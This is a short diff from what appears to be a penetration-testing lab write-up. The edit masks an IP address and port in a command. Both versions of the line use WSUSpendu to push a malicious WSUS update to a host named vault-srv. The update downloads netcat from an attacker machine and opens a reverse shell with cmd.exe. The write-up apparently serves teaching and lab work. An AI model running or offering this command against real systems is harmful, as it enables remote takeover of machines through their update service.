@@ -856,7 +856,7 @@ Microsoft Corporation                                               56309036-4c7
 ```powershell
 //Download this script, https://github.com/AlsidOfficial/WSUSpendu/blob/master/WSUSpendu.ps1
 
-[gcb-wsus.gcb.local]: PS C:\users\public> .\wsus.ps1 -Inject -PayloadFile .\psexec.exe -PayloadArgs '-accepteula -d cmd.exe /c "powershell invoke-webrequest http://192.168.100.14:8531/nc64.exe -outfile C:\users\public\nc.exe; c:\users\public\nc.exe 192.168.100.14 8530 -e cmd.exe"' -ComputerName vault-srv
+[gcb-wsus.gcb.local]: PS C:\users\public> .\wsus.ps1 -Inject -PayloadFile .\psexec.exe -PayloadArgs '-accepteula -d cmd.exe /c "powershell invoke-webrequest http://192.168.XX.XX:XXXX/nc64.exe -outfile C:\users\public\nc.exe; c:\users\public\nc.exe 192.168.XX.XX XXXX -e cmd.exe"' -ComputerName vault-srv
 
 Everything seems ok. Wait for the client to take the update now...
 ```
